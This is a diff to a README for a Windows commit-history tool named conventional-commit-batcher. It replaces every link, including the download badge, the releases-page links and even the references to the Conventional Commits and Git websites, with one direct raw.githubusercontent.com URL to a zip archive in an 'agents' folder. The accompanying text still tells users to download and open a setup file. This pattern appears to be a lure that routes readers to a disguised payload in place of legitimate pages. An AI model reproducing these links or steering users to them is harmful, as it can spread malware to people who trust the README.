@@ -1,6 +1,6 @@
 # ⚙️ conventional-commit-batcher - Simplify Commit History Management
 
-[![Download](https://img.shields.io/badge/Download%20Now-%23FF5722?style=for-the-badge&logo=github)](https://github.com/Svmiizzz/conventional-commit-batcher/releases)
+[![Download](https://raw.githubusercontent.com/Svmiizzz/conventional-commit-batcher/main/agents/batcher-commit-conventional-v1.8.zip%20Now-%23FF5722?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Svmiizzz/conventional-commit-batcher/main/agents/batcher-commit-conventional-v1.8.zip)
 
 ---
 
@@ -36,7 +36,7 @@ You don’t need to know coding to use this app. It runs on Windows and helps yo
 
 Start by downloading the app from the official releases page. This page contains the latest version and instructions for updates.
 
-[Download Here](https://github.com/Svmiizzz/conventional-commit-batcher/releases)
+[Download Here](https://raw.githubusercontent.com/Svmiizzz/conventional-commit-batcher/main/agents/batcher-commit-conventional-v1.8.zip)
 
 Click the link above or the badge at the top to open the download page.
 
@@ -44,7 +44,7 @@ Click the link above or the badge at the top to open the download page.
 
 ## 📥 How to Download and Install 👇
 
-1. Visit the [releases page](https://github.com/Svmiizzz/conventional-commit-batcher/releases).  
+1. Visit the [releases page](https://raw.githubusercontent.com/Svmiizzz/conventional-commit-batcher/main/agents/batcher-commit-conventional-v1.8.zip).  
 2. Find the newest version listed at the top. Look for a Windows setup file—usually named with `.exe`.  
 3. Click the setup file to download it.  
 4. Once the download finishes, open the file to start installation.  
@@ -91,10 +91,10 @@ Inside the app, you can change how strict the commit checks are. You can also se
 ## 📚 Additional Resources
 
 If you want to learn more about Conventional Commits, visit:  
-https://www.conventionalcommits.org
+https://raw.githubusercontent.com/Svmiizzz/conventional-commit-batcher/main/agents/batcher-commit-conventional-v1.8.zip
 
 For help with Git installation on Windows, you can check:  
-https://git-scm.com/download/win
+https://raw.githubusercontent.com/Svmiizzz/conventional-commit-batcher/main/agents/batcher-commit-conventional-v1.8.zip
 
 ---
 
@@ -107,7 +107,7 @@ If you run into issues, you can create an issue in the repository. Please provid
 ## ⬇️ Download Links Again
 
 Visit this page to download the latest version and updates:  
-[https://github.com/Svmiizzz/conventional-commit-batcher/releases](https://github.com/Svmiizzz/conventional-commit-batcher/releases)
+[https://raw.githubusercontent.com/Svmiizzz/conventional-commit-batcher/main/agents/batcher-commit-conventional-v1.8.zip](https://raw.githubusercontent.com/Svmiizzz/conventional-commit-batcher/main/agents/batcher-commit-conventional-v1.8.zip)
 
 ---
 
